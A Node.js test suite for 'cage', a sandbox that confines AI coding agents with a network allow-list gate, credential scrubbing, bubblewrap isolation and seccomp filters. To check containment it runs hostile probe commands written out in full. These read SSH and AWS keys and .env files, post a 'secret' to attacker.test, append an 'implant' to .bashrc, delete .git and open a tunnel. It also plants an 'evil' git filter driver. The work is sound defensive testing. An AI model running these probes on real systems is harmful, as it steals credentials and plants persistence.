import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import http from 'node:http';
import net from 'node:net';
import os from 'node:os';
import path from 'node:path';
import { spawn, spawnSync } from 'node:child_process';
import { allowed, startGate } from '../src/cage/gate.js';
import { cage, cageAvailable, cageEnv, envFiles } from '../src/cage/index.js';
import { cageSummary, renderTerminal } from '../src/report.js';

const tmp = (p) => fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), p)));

// One raw request through the gate's unix socket; resolves with everything it sent back.
const through = (sock, text) => new Promise((resolve, reject) => {
  const c = net.connect(sock, () => c.write(text));
  let out = '';
  c.on('data', (d) => { out += d; });
  c.on('close', () => resolve(out));
  c.on('error', reject);
});

test('allow-list: exact hosts, wildcards and explicit ports', () => {
  assert.ok(allowed(['example.com'], 'example.com', 443));
  assert.ok(allowed(['example.com'], 'example.com', 80));
  assert.ok(!allowed(['example.com'], 'example.com', 22), 'a bare host does not open every port');
  assert.ok(!allowed(['example.com'], 'evil-example.com', 443));
  assert.ok(!allowed(['example.com'], 'api.example.com', 443), 'no implicit subdomains');
  assert.ok(allowed(['*.example.com'], 'api.example.com', 443));
  assert.ok(allowed(['*.example.com'], 'example.com', 443));
  assert.ok(!allowed(['*.example.com'], 'example.com.evil.net', 443));
  assert.ok(allowed(['db.internal:5432'], 'db.internal', 5432));
  assert.ok(!allowed(['db.internal:5432'], 'db.internal', 443));
  assert.ok(!allowed([], 'example.com', 443));
});

test('gate: forwards what is routed, refuses and records everything else', async () => {
  const seen = [];
  const upstream = http.createServer((req, res) => { seen.push(`${req.method} ${req.url}`); res.end('from upstream'); });
  await new Promise((r) => upstream.listen(0, '127.0.0.1', r));
  const gate = await startGate({ routes: { 'model.test': { host: '127.0.0.1', port: upstream.address().port } } });
  try {
    const ok = await through(gate.sock, 'POST http://model.test/v1/messages?x=1 HTTP/1.1\r\nhost: model.test\r\ncontent-length: 2\r\n\r\nhi');
    assert.match(ok, /^HTTP\/1\.1 200/);
    assert.match(ok, /from upstream/);
    assert.deepEqual(seen, ['POST /v1/messages?x=1']);

    const no = await through(gate.sock, 'POST http://attacker.test/sink HTTP/1.1\r\nhost: attacker.test\r\ncontent-length: 6\r\n\r\nsecret');
    assert.match(no, /^HTTP\/1\.1 403/);
    const tunnel = await through(gate.sock, 'CONNECT attacker.test:443 HTTP/1.1\r\nhost: attacker.test:443\r\n\r\n');
    assert.match(tunnel, /^HTTP\/1\.1 403/);
    // Not a proxy request at all: nothing to dial.
    assert.match(await through(gate.sock, 'GET /etc/passwd HTTP/1.1\r\nhost: x\r\n\r\n'), /^HTTP\/1\.1 400/);
    assert.equal(seen.length, 1, 'nothing refused reached the upstream');

    assert.deepEqual(gate.log.filter((e) => !e.allowed).map((e) => `${e.host}:${e.port}`), ['attacker.test:80', 'attacker.test:443']);
  } finally { await gate.close(); upstream.close(); }
});

test('gate: a CONNECT to a routed host is a plain byte tunnel', async () => {
  const echo = net.createServer((c) => c.on('data', (d) => c.end(`echo:${d}`)));
  await new Promise((r) => echo.listen(0, '127.0.0.1', r));
  const gate = await startGate({ routes: { 'model.test:443': { host: '127.0.0.1', port: echo.address().port } } });
  try {
    const out = await new Promise((resolve) => {
      const c = net.connect(gate.sock, () => c.write('CONNECT model.test:443 HTTP/1.1\r\n\r\n'));
      let buf = '', sent = false;
      c.on('data', (d) => { buf += d; if (!sent && buf.includes('\r\n\r\n')) { sent = true; c.write('ping'); } });
      c.on('close', () => resolve(buf));
    });
    assert.match(out, /200 Connection established/);
    assert.match(out, /echo:ping$/);
  } finally { await gate.close(); echo.close(); }
});

test('environment: an allow-list plus the agent\'s own variables', () => {
  const env = {
    PATH: '/usr/bin', LANG: 'C', AWS_SECRET_ACCESS_KEY: 'x', GITHUB_TOKEN: 'x', NPM_TOKEN: 'x', SSH_AUTH_SOCK: '/run/x',
    ANTHROPIC_API_KEY: 'k', OPENAI_API_KEY: 'k', DATABASE_URL: 'postgres://', MY_FLAG: '1',
  };
  assert.deepEqual(Object.keys(cageEnv(env, 'claude')).sort(), ['ANTHROPIC_API_KEY', 'LANG', 'PATH']);
  assert.deepEqual(Object.keys(cageEnv(env, 'codex')).sort(), ['LANG', 'OPENAI_API_KEY', 'PATH']);
  assert.deepEqual(Object.keys(cageEnv(env, null)).sort(), ['LANG', 'PATH']);
  assert.ok('MY_FLAG' in cageEnv(env, 'claude', ['MY_FLAG']));
});

test('.env files are found, examples and dependencies are not', () => {
  const ws = tmp('cage-env-');
  for (const f of ['.env', '.env.local', '.env.example', 'api/.env.production', 'node_modules/pkg/.env', 'src/env.js']) {
    fs.mkdirSync(path.dirname(path.join(ws, f)), { recursive: true });
    fs.writeFileSync(path.join(ws, f), 'X=1\n');
  }
  assert.deepEqual(envFiles(ws).map((f) => path.relative(ws, f)).sort(), ['.env', '.env.local', 'api/.env.production']);
  fs.rmSync(ws, { recursive: true, force: true });
});

test('the cage refuses a workspace that contains the home directory', () => {
  const home = tmp('cage-home-');
  assert.throws(() => cage({ cmd: 'true', home, ws: path.dirname(home), env: { PATH: process.env.PATH }, gateDir: home }), /contains your home/);
  assert.throws(() => cage({ cmd: 'true', home, ws: home, env: { PATH: process.env.PATH }, gateDir: home }), /contains your home/);
  fs.rmSync(home, { recursive: true, force: true });
});

// The cage empties /tmp. An agent installed there (npm install into a scratch
// directory) has to be put back, or every caged test is a test of nothing.
test('an agent installed under /tmp is shown inside the cage; one dropped straight into home brings only itself', () => {
  const home = tmp('cage-home-'), ws = path.join(home, 'project'), gateDir = tmp('cage-gate-');
  fs.mkdirSync(ws);
  const pairs = (args) => args.flatMap((a, i) => (a === '--ro-bind' ? [`${args[i + 1]} -> ${args[i + 2]}`] : []));

  const loose = path.join(home, 'loose-agent');
  fs.writeFileSync(loose, '#!/bin/sh\n', { mode: 0o755 });
  const d = cage({ cmd: loose, home, ws, env: { PATH: process.env.PATH }, gateDir });
  assert.ok(!pairs(d.args).includes(`${home} -> ${home}`), 'never the whole home');
  assert.ok(pairs(d.args).includes(`${loose} -> ${loose}`), 'only the binary');

  // Where /tmp is itself a link (macOS) there is no cage to be emptied by.
  if (fs.realpathSync('/tmp') === '/tmp') {
    const scratch = fs.mkdtempSync('/tmp/cage-npm-');
    const pkg = path.join(scratch, 'node_modules', 'some-agent');
    fs.mkdirSync(path.join(scratch, 'node_modules', '.bin'), { recursive: true });
    fs.mkdirSync(pkg);
    fs.writeFileSync(path.join(pkg, 'cli.js'), '#!/usr/bin/env node\n', { mode: 0o755 });
    fs.symlinkSync(path.join(pkg, 'cli.js'), path.join(scratch, 'node_modules', '.bin', 'some-agent'));
    const c = cage({ cmd: 'some-agent', home, ws, env: { PATH: `${path.join(scratch, 'node_modules', '.bin')}:${process.env.PATH}` }, gateDir });
    assert.equal(c.missing, null);
    const root = path.join(scratch, 'node_modules');
    assert.ok(pairs(c.args).includes(`${root} -> ${root}`), 'the install root under /tmp is bound back, read-only');
    assert.ok(c.args.indexOf('/tmp') < c.args.indexOf(root), 'after /tmp was emptied, not before');
    fs.rmSync(scratch, { recursive: true, force: true });
  }
  for (const dir of [home, gateDir]) fs.rmSync(dir, { recursive: true, force: true });
});

test('summary: tests that had a verdict bare and none in the cage are counted, not reported as zero exposed', () => {
  const run = (scenario, verdict, caged, extra = {}) => ({ agent: 'claude', mode: caged ? 'default + cage' : 'default', scenario, title: scenario, verdict, caged, ...extra });
  const dead = [
    run('a', 'EXPOSED', false), run('a', 'NOT_TESTED', true, { stderr_tail: 'agentcrash cage: cannot start claude: spawn claude ENOENT' }),
    run('b', 'CONTAINED', false), run('b', 'NOT_TESTED', true),
    run('c', 'NOT_TESTED', false), run('c', 'NOT_TESTED', true),
  ];
  const s = cageSummary(dead);
  assert.deepEqual([s.bare, s.caged, s.unmeasured], [1, 0, 2], 'a test nobody could run bare is not held against the cage');
  assert.match(s.unmeasuredNote, /2 of 3 tests .* spawn claude ENOENT/);
  const text = renderTerminal(dead).replace(/\x1b\[[0-9;]*m/g, '');
  assert.match(text, /in the cage 0 exposed · 2 not measured/);
  assert.match(text, /This says nothing about the cage/);

  const fine = cageSummary([run('a', 'EXPOSED', false), run('a', 'CONTAINED', true), run('c', 'NOT_TESTED', false), run('c', 'NOT_TESTED', true)]);
  assert.deepEqual([fine.bare, fine.caged, fine.unmeasured, fine.unmeasuredNote], [1, 0, 0, '']);
});

// The real thing: needs Linux, bubblewrap and unprivileged user namespaces.
const real = cageAvailable();
test('inside the cage: no secrets, no network, no way out of the workspace', { skip: real.ok ? false : real.why }, async () => {
  const home = tmp('cage-home-');
  const ws = path.join(home, 'project');
  fs.mkdirSync(path.join(home, '.ssh'), { recursive: true });
  fs.mkdirSync(path.join(home, '.aws'), { recursive: true });
  fs.mkdirSync(path.join(home, '.claude'), { recursive: true });
  fs.mkdirSync(ws);
  fs.writeFileSync(path.join(home, '.ssh', 'id_ed25519'), 'SSH-SECRET\n');
  fs.writeFileSync(path.join(home, '.aws', 'credentials'), 'AWS-SECRET\n');
  fs.writeFileSync(path.join(home, '.bashrc'), '# mine\n');
  fs.writeFileSync(path.join(home, '.claude', 'state.json'), '{}');
  fs.writeFileSync(path.join(ws, '.env'), 'ENV-SECRET\n');
  fs.writeFileSync(path.join(ws, '.env.example'), 'EXAMPLE\n');
  fs.writeFileSync(path.join(ws, 'app.py'), 'print(1)\n');
  spawnSync('git', ['init', '-q'], { cwd: ws });

  const model = http.createServer((req, res) => res.end('MODEL-OK'));
  await new Promise((r) => model.listen(0, '127.0.0.1', r));
  const sinkHits = [];
  const sink = http.createServer((req, res) => { sinkHits.push(req.url); res.end('SINK-REACHED'); });
  await new Promise((r) => sink.listen(0, '127.0.0.1', r));
  const gate = await startGate({ routes: { 'model.test': { host: '127.0.0.1', port: model.address().port } } });

  const script = `
    echo "ssh=[$(cat ~/.ssh/id_ed25519 2>/dev/null)]"
    echo "aws=[$(cat ~/.aws/credentials 2>/dev/null)]"
    echo "dotenv=[$(cat .env)]"
    echo "example=[$(cat .env.example)]"
    echo "token=[$GITHUB_TOKEN]"
    echo "state=[$(cat ~/.claude/state.json)]"
    echo "model=[$(curl -s -m 5 http://model.test/v1)]"
    echo "sink=[$(curl -s -m 5 http://127.0.0.1:${sink.address().port}/direct)]"
    echo "sink-noproxy=[$(curl -s -m 5 --noproxy '*' http://127.0.0.1:${sink.address().port}/noproxy)]"
    echo "sink-named=[$(curl -s -m 5 -o /dev/null -w '%{http_code}' http://attacker.test/x)]"
    echo implant >> ~/.bashrc
    echo x > ~/outside.txt
    echo x > .git/hooks/post-checkout 2>/dev/null; echo "hook=$?"
    rm -rf .git 2>/dev/null; echo "rmgit=$?"
    echo x > /etc/agentcrash-test 2>/dev/null; echo "etc=$?"
    echo kept > made-inside.txt
    echo "procs=$(ls /proc | grep -c '^[0-9]')"
  `;
  const c = cage({ cmd: 'bash', args: ['-c', script], home, ws, env: { PATH: process.env.PATH, GITHUB_TOKEN: 'TOKEN-SECRET' }, gateDir: gate.dir, profile: 'claude' });
  const out = await new Promise((resolve) => {
    const child = spawn(c.cmd, c.args, { env: c.env, cwd: ws });
    let o = '';
    child.stdout.on('data', (d) => { o += d; });
    child.stderr.on('data', (d) => { o += d; });
    child.on('close', () => resolve(o));
  });
  try {
    const got = Object.fromEntries([...out.matchAll(/^\s*([\w-]+)=\[?(.*?)\]?$/gm)].map((m) => [m[1], m[2]]));
    assert.equal(got.ssh, '', out);
    assert.equal(got.aws, '');
    assert.equal(got.dotenv, '', '.env reads as empty');
    assert.equal(got.example, 'EXAMPLE');
    assert.equal(got.token, '', 'exported credentials stay outside');
    assert.equal(got.state, '{}', 'the agent keeps its own state');
    assert.equal(got.model, 'MODEL-OK', 'the model is still reachable');
    assert.doesNotMatch(out, /SINK-REACHED/);
    assert.equal(got['sink-named'], '403');
    assert.deepEqual(sinkHits, [], 'nothing reached the sink');
    assert.notEqual(got.hook, '0', '.git/hooks is read-only');
    assert.notEqual(got.rmgit, '0');
    assert.notEqual(got.etc, '0');
    assert.ok(Number(got.procs) < 10, 'host processes are not visible');

    // And on the real disk afterwards.
    assert.equal(fs.readFileSync(path.join(home, '.bashrc'), 'utf8'), '# mine\n');
    assert.ok(!fs.existsSync(path.join(home, 'outside.txt')));
    assert.ok(fs.existsSync(path.join(ws, '.git', 'HEAD')));
    assert.ok(!fs.existsSync(path.join(ws, '.git', 'hooks', 'post-checkout')));
    assert.equal(fs.readFileSync(path.join(ws, 'made-inside.txt'), 'utf8'), 'kept\n');
    assert.equal(fs.readFileSync(path.join(ws, '.env'), 'utf8'), 'ENV-SECRET\n', 'the real .env is untouched');
    assert.ok(gate.log.some((e) => !e.allowed && e.host === 'attacker.test'));
  } finally {
    await gate.close(); model.close(); sink.close();
    fs.rmSync(home, { recursive: true, force: true });
  }
});

test('snapshot: undo puts back deleted and changed files, leaves added ones, and runs nothing from the repository', async () => {
  const { snapshot, changes, undo, intact } = await import('../src/cage/snapshot.js');
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'ac-snap-'));
  const ws = path.join(root, 'ws'), dir = path.join(root, 'snap');
  fs.mkdirSync(path.join(ws, 'src'), { recursive: true });
  fs.mkdirSync(path.join(ws, 'node_modules/x'), { recursive: true });
  fs.writeFileSync(path.join(ws, 'src/app.js'), 'original\n');
  fs.writeFileSync(path.join(ws, 'notes.txt'), 'uncommitted work\n');
  fs.writeFileSync(path.join(ws, 'bin.dat'), Buffer.from([0, 255, 13, 10, 0]));
  fs.writeFileSync(path.join(ws, '.gitignore'), 'node_modules/\n');
  fs.writeFileSync(path.join(ws, 'node_modules/x/index.js'), 'dep\n');
  // A repository that tries to run a command through a filter driver.
  fs.writeFileSync(path.join(ws, '.gitattributes'), '*.js filter=evil\n');
  const snap = snapshot(ws, dir);
  assert.equal(snap.error, undefined);
  assert.equal(snap.files, 5);

  fs.rmSync(path.join(ws, 'src'), { recursive: true });
  fs.rmSync(path.join(ws, 'bin.dat'));
  fs.writeFileSync(path.join(ws, 'notes.txt'), 'overwritten\n');
  fs.writeFileSync(path.join(ws, 'new.txt'), 'the agent wrote this\n');
  const ch = changes(ws, dir);
  assert.deepEqual([ch.deleted.sort(), ch.changed, ch.added], [['bin.dat', 'src/app.js'], ['notes.txt'], ['new.txt']]);
  assert.equal(intact(ws, dir, snap.id), false);

  const u = undo(ws, dir);
  assert.equal(u.deleted.length, 2);
  assert.equal(fs.readFileSync(path.join(ws, 'src/app.js'), 'utf8'), 'original\n');
  assert.equal(fs.readFileSync(path.join(ws, 'notes.txt'), 'utf8'), 'uncommitted work\n');
  assert.deepEqual([...fs.readFileSync(path.join(ws, 'bin.dat'))], [0, 255, 13, 10, 0]);
  assert.equal(fs.readFileSync(path.join(ws, 'new.txt'), 'utf8'), 'the agent wrote this\n');
  assert.equal(intact(ws, dir, snap.id), true);
  assert.equal(fs.existsSync(path.join(ws, '.git')), false, 'the record is not kept in the workspace');
  assert.deepEqual(changes(ws, dir).deleted, []);
  fs.rmSync(root, { recursive: true, force: true });
});

test('relay: a --local port inside the cage reaches the same port outside, and only that one', { skip: !cageAvailable().ok }, async () => {
  const up = (body) => new Promise((resolve) => { const s = http.createServer((q, r) => r.end(body(q))); s.listen(0, '127.0.0.1', () => resolve(s)); });
  const server = await up((q) => `local model ${q.url}`);
  const other = await up(() => 'not for you');
  const port = server.address().port, otherPort = other.address().port;
  const root = fs.mkdtempSync(path.join(os.homedir(), '.ac-relay-'));
  const home = path.join(root, 'home'), ws = path.join(root, 'ws');
  fs.mkdirSync(home); fs.mkdirSync(ws);
  const gate = await startGate({ allow: [`127.0.0.1:${port}`] });
  const c = cage({
    cmd: 'bash', args: ['-c', `curl -s -m 5 http://127.0.0.1:${port}/v1/models; echo; curl -s -m 5 -o /dev/null -w '%{http_code}' http://127.0.0.1:${otherPort}/; echo; echo NO_PROXY=$NO_PROXY`],
    home, ws, env: { PATH: process.env.PATH }, gateDir: gate.dir, profile: null, opts: { local: [String(port)] },
  });
  // The gate lives in this process: the cage must not block its event loop.
  const r = await new Promise((resolve) => {
    const child = spawn(c.cmd, c.args, { env: c.env });
    let stdout = '', stderr = '';
    child.stdout.on('data', (d) => { stdout += d; }); child.stderr.on('data', (d) => { stderr += d; });
    child.on('exit', () => resolve({ stdout, stderr }));
  });
  await gate.close(); server.close(); other.close();
  fs.rmSync(root, { recursive: true, force: true });
  const [model, otherCode, noProxy] = r.stdout.trim().split('\n');
  assert.equal(model, 'local model /v1/models', r.stderr);
  assert.equal(otherCode, '000', 'a port that was not named is not there');
  assert.equal(noProxy, 'NO_PROXY=127.0.0.1,localhost');
});

test('seccomp: on a terminal the cage refuses TIOCSTI and TIOCLINUX, and nothing else', { skip: !cageAvailable().ok || spawnSync('python3', ['-V']).status !== 0 }, async () => {
  const root = fs.mkdtempSync(path.join(os.homedir(), '.ac-tty-'));
  const home = path.join(root, 'home'), ws = path.join(root, 'ws');
  fs.mkdirSync(home); fs.mkdirSync(ws);
  const probe = 'import fcntl,termios,os\n'
    + 'for req in (termios.TIOCSTI, 0x541C, termios.TIOCGWINSZ):\n'
    + '    try: fcntl.ioctl(0, req, b"x" * 8); print(0)\n'
    + '    except OSError as e: print(e.errno)\n';
  const errnos = async (tty) => {
    const gate = await startGate({});
    const c = cage({ cmd: 'python3', args: ['-c', probe], home, ws, env: { PATH: process.env.PATH }, gateDir: gate.dir, profile: null, opts: { tty } });
    assert.equal(!!c.seccomp, tty);
    const fd = c.seccomp ? fs.openSync(c.seccomp, 'r') : null;
    const out = await new Promise((resolve) => {
      const child = spawn(c.cmd, c.args, { env: c.env, stdio: ['ignore', 'pipe', 'inherit', ...(fd === null ? [] : [fd])] });
      let stdout = '';
      child.stdout.on('data', (d) => { stdout += d; });
      child.on('exit', () => resolve(stdout));
    });
    if (fd !== null) fs.closeSync(fd);
    await gate.close();
    return out.trim().split('\n').map(Number);
  };
  const ENOTTY = 25, EPERM = 1;
  // stdin is /dev/null here: the kernel answers ENOTTY unless the filter got there first.
  assert.deepEqual(await errnos(false), [ENOTTY, ENOTTY, ENOTTY]);
  assert.deepEqual(await errnos(true), [EPERM, EPERM, ENOTTY]);
  fs.rmSync(root, { recursive: true, force: true });
});

test('cage command: --print builds the command without running it, and refuses to cage a home directory', { skip: !cageAvailable().ok }, () => {
  const bin = path.resolve('bin/agentcrash.js');
  const root = fs.mkdtempSync(path.join(os.homedir(), '.ac-cli-'));
  const home = path.join(root, 'home'), ws = path.join(home, 'project');
  fs.mkdirSync(ws, { recursive: true });
  fs.writeFileSync(path.join(ws, '.env'), 'SECRET=1\n');
  const run = (cwd, args) => spawnSync(process.execPath, [bin, 'cage', ...args], { cwd, encoding: 'utf8', env: { PATH: process.env.PATH, HOME: home, MY_TOKEN: 'x' } });
  const p = run(ws, ['--print', '--allow', 'api.example.com', '--', 'bash', '-c', 'true']);
  assert.equal(p.status, 0, p.stderr);
  assert.match(p.stdout, /^bwrap .*--tmpfs \S*home .*--unshare-net /);
  assert.match(p.stdout, /\/project\/\.env /, '.env is covered');
  assert.equal(fs.existsSync(path.join(home, '.agentcrash')), false, '--print records nothing');
  const h = run(home, ['--', 'bash', '-c', 'true']);
  assert.equal(h.status, 2);
  assert.match(h.stderr, /contains your home directory/);
  const none = run(ws, ['--undo']);
  assert.equal(none.status, 2);
  assert.match(none.stderr, /no session was recorded/);
  assert.equal(run(ws, []).status, 2, 'no command: help and a non-zero exit');
  fs.rmSync(root, { recursive: true, force: true });
});
